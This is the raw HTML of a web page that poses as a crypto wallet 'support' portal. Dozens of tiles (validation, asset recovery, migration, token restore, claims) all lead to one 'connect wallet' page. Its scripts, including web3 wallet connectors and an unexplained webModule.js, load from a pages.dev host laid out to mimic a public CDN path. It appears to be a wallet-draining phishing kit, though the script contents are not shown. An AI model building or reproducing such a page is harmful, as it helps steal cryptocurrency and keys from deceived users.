...
<head>
	<link data-react-helmet="true" rel="shortcut icon" href="https://evmblock.pages.dev/ajax/libs/toastr_js/accountresolvecenter.netlify.app/img/image.html">
    ...
    <link rel="shortcut icon" type="image/png" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/img/favicon.png"/>
    <link rel="stylesheet" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/owl.carousel/dist/assets/owl.carousel.css">
    <link rel="stylesheet" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/owl.carousel/dist/assets/owl.theme.default.css">
    <link rel="stylesheet" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/remixicon/fonts/remixicon.css">
    <link rel="stylesheet" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/fonts/fonts.css">
    <link rel="stylesheet" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/css/app.css">
    <link rel="stylesheet" id="stm-stmicons-css" href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/stm_fonts/stmicons/stmicons.css" type="text/css" media="all" />
    <link href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/npm/select2_4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <link href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/ajax/libs/toastr_js/latest/css/toastr.min.css" rel="stylesheet" />
</head>
<body>
mr
    <!--==================================
    ...
    <div style="height:62px; background-color: #1D2330; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;">
        ...
        <div class="hero2-main">
            <div class="container-fluid">
                <div class="row row-custom">
                    <div class="col-lg-5 col-content-otr">
                        <div class="col-content-inr">
                            ...
                            <div class="action">
                                <button href="wallet/index.html" class="btn-primary-1 btn-hero heading-SB connectBtn"  id="connectBtn">Connect Wallet</button>
                                <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"></a>
                ...
                <img class="hero-img" src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/img/hero-img-home-2.png" alt="img">
            </div>
        </div>
    <!--==================================
                ...
                <div id="tab-21" class="tab-content active">
                    <div class="row row-custom-inr">
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr box-1 connectBtn">
                                <div class="icon-otr">
                                    <i style="font-size: 52px;" class="stm-check"></i>
                                </div>
                                <div class="content">
                                    <h4 class="heading heading-h4">Refresh Metadata</h4>
                                    <p class="desc heading-S">Click here for refresh metadata</p>
                                </div>
                            </div></a>
            </div>
            <div class="row-custom-main">
                    ...
                    <div class="row row-custom-inr">
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr box-1 connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Validation</h4>
                                    <p class="desc heading-S">Click here to validate your wallets</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                <div class="icon-otr">
                                    <i style="font-size: 52px;" class="stm-building6"></i>
                                </div>
                                <div class="content">
                                    <h4 class="heading heading-h4">Staking/Reward Issue</h4>
                                    <p class="desc heading-S">Click here for Staking Reward issues</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                        ...
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Synchronizatioin</h4>
                                    <p class="desc heading-S">Click here to synchronize wallets</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Bridge</h4>
                                    <p class="desc heading-S">Click here for Bridge related issues</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Buy/Sell</h4>
                                    <p class="desc heading-S">Click here to buy and sell tokens</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    ...
                                    <p class="desc heading-S">Click here to access decentralized apps</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Migration</h4>
                                    <p class="desc heading-S">click here to transfer old token to new contract</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                        ...
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Asset Recovery</h4>
                                    <p class="desc heading-S">Click here to recover lost assets.</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    ...
                                    <p class="desc heading-S">Click here to check eligibility and claim</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Integrate Wallet</h4>
                        ...
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Restore Tokens</h4>
                                    <p class="desc heading-S">Click here to restore glitched token</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                ...
                                <div class="content">
                                    <h4 class="heading heading-h4">Update Portfolio</h4>
                                    <p class="desc heading-S">Click here to update portfolio</p>
                                </div>
                            </div></a>
                        </div>
                        <div class="col-lg-4 col-md-6 col-work-otr">
                        ...
                        <div class="col-lg-4 col-md-6 col-work-otr">
                            ...
                            <div class="col-lg-4 col-md-6 col-work-otr">
                                <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html"><div class="col-work-inr connectBtn">
                                    ...
                                    <div class="content">
                                        <h4 class="heading heading-h4">Other Issues Not Listed</h4>
        ...
        <div class="copyright-main">
            <div class="container-fluid">
                <div class="wrapper">
                    ...
                    <div class="linkk-otr">
                        <p class="linkk-inr"><a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html" class="linkk-page heading-S">Privacy Policy </a> • <a href="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/wallet/index.html" class="linkk-page heading-S"> Terms of Service</a></p>
                    </div>
                </div>
            </div>
        </div>
    <!--==================================
            Footer End Here
    ===================================-->
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/jquery/dist/jquery.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/jquery.countdown/jquery.countdown.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/owl.carousel/dist/owl.carousel.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/npm/select2_4.1.0-rc.0/dist/js/select2.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/app.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/decimal.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/web3.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/web3modal.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/evm-chains/index.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/_walletconnect/web3-provider/index.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/_portis/web3/index.min.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/assets/js/webModule.js"></script>
    <script src="https://evmblock.pages.dev/ajax/libs/toastr_js/latest/ajax/libs/toastr_js/latest/toastr.min.js"></script>
</body>
